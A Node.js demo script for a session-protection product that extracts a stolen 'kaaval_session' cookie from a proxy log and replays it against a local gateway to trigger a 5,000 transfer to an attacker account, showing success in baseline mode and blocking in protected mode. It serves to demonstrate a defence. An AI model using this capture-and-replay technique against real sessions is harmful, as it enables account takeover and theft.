#!/usr/bin/env node
// =============================================================================
//  replay-cookie.js  —  SIMULATED AiTM COOKIE THEFT/REPLAY, DEMO USE ONLY
// =============================================================================
//
//  Scenes 1-2 of the choreography. Captures a session cookie the attacker
//  proxy skimmed off the wire, then replays it "from a different browser":
//
//    baseline  mode -> the replay SUCCEEDS (HTTP 200). Required negative
//                      control (PRD FR-14): it proves the theft is real.
//    protected mode -> the replay is BLOCKED (HTTP 401, reason proof_absent):
//                      the stolen cookie is no longer a bearer credential.
//
//  It sends the cookie in a raw `Cookie:` header, so the cookie's Secure/
//  HttpOnly flags are irrelevant here (those bind a *browser*, not a script) —
//  which is exactly why a cookie alone is dangerous, and exactly what PulseLock
//  neutralises.
//
//  NOTE: the authoritative, full Scene 0-5 attack tool is the Python attacker
//  console at backend/attacker_console/replay.py (owned by gateway-core, left
//  untouched). This is the lightweight demo-tools equivalent for cookie replay.
//
//  Usage:
//    node replay-cookie.js capture [PROXY_LOG]   # pull latest cookie from a
//                                                # proxy log into .captured-cookie
//    node replay-cookie.js replay [--mode baseline|protected] [--cookie VALUE]
//    node replay-cookie.js                       # == replay --mode baseline
//
//  Env:
//    BASE_URL   gateway to hit         (default http://localhost:8000 — the
//               attacker sits on Laptop B alongside the backend)
//    COOKIE     stolen kaaval_session  (else read from .captured-cookie file)

"use strict";

const fs = require("fs");
const path = require("path");

const BASE_URL = (process.env.BASE_URL || "http://localhost:8000").replace(/\/$/, "");
const COOKIE_FILE = path.join(__dirname, ".captured-cookie");
const COOKIE_NAME = "kaaval_session";
const TRANSFER_PATH = "/api/transfer";

function parseArgs(argv) {
  const out = { _: [] };
  for (let i = 0; i < argv.length; i++) {
    const a = argv[i];
    if (a === "--mode") out.mode = argv[++i];
    else if (a === "--cookie") out.cookie = argv[++i];
    else out._.push(a);
  }
  return out;
}

function captureFromLog(logPath) {
  if (!logPath || !fs.existsSync(logPath)) {
    console.error(`[replay-cookie] no proxy log at ${logPath || "(unset)"}`);
    console.error(`  Pass the log the proxy writes, e.g.:`);
    console.error(`    node replay-cookie.js capture /path/to/proxy.log`);
    console.error(`  or set the cookie directly: COOKIE=<value> node replay-cookie.js replay`);
    process.exit(1);
  }
  const text = fs.readFileSync(logPath, "utf8");
  const re = new RegExp(`${COOKIE_NAME}=([^;"\\s]+)`, "g");
  let m, last = null;
  while ((m = re.exec(text)) !== null) last = m[1];
  if (!last) {
    console.error(`[replay-cookie] no ${COOKIE_NAME} cookie found in ${logPath} yet.`);
    console.error(`  Have the victim log in through the proxy first (Scene 0).`);
    process.exit(1);
  }
  fs.writeFileSync(COOKIE_FILE, last, "utf8");
  console.log(`[replay-cookie] captured ${COOKIE_NAME}=${last.slice(0, 12)}… -> ${COOKIE_FILE}`);
}

function resolveCookie(explicit) {
  if (explicit) return explicit;
  if (process.env.COOKIE) return process.env.COOKIE;
  if (fs.existsSync(COOKIE_FILE)) return fs.readFileSync(COOKIE_FILE, "utf8").trim();
  console.error(`[replay-cookie] no cookie: pass --cookie VALUE, set COOKIE=, or run`);
  console.error(`  'node replay-cookie.js capture <proxy.log>' first.`);
  process.exit(1);
}

async function replay(mode, cookieValue) {
  const url = `${BASE_URL}${TRANSFER_PATH}?mode=${mode}`;
  const body = JSON.stringify({ to_account: "acct-attacker", amount: 5000 });
  console.log(`[replay-cookie] replaying stolen cookie against ${url}`);
  let res, payload;
  try {
    res = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Cookie: `${COOKIE_NAME}=${cookieValue}`,
      },
      body,
    });
    payload = await res.text();
  } catch (err) {
    console.error(`[replay-cookie] request failed: ${err.message}`);
    console.error(`  Is the core stack running (start-demo.sh)? BASE_URL=${BASE_URL}`);
    process.exit(1);
  }
  console.log(`  HTTP ${res.status}  ${payload}`);
  if (mode === "baseline") {
    console.log(
      res.ok
        ? "  -> TRANSFER WENT THROUGH — the stolen cookie alone is enough. (expected in baseline)"
        : "  -> unexpected: baseline replay did NOT succeed; the negative control is broken.",
    );
  } else {
    console.log(
      res.ok
        ? "  -> unexpected: protected mode accepted a cookie with no proof."
        : "  -> BLOCKED — cookie alone is not sufficient under PulseLock. (expected: proof_absent)",
    );
  }
}

async function main() {
  const args = parseArgs(process.argv.slice(2));
  const cmd = args._[0] || "replay";
  if (cmd === "capture") {
    captureFromLog(args._[1] || process.env.PROXY_LOG);
    return;
  }
  if (cmd === "replay") {
    const mode = args.mode || "baseline";
    if (mode !== "baseline" && mode !== "protected") {
      console.error(`[replay-cookie] --mode must be baseline or protected`);
      process.exit(2);
    }
    await replay(mode, resolveCookie(args.cookie));
    return;
  }
  console.error(`[replay-cookie] unknown command "${cmd}". Use: capture | replay`);
  process.exit(2);
}

main();
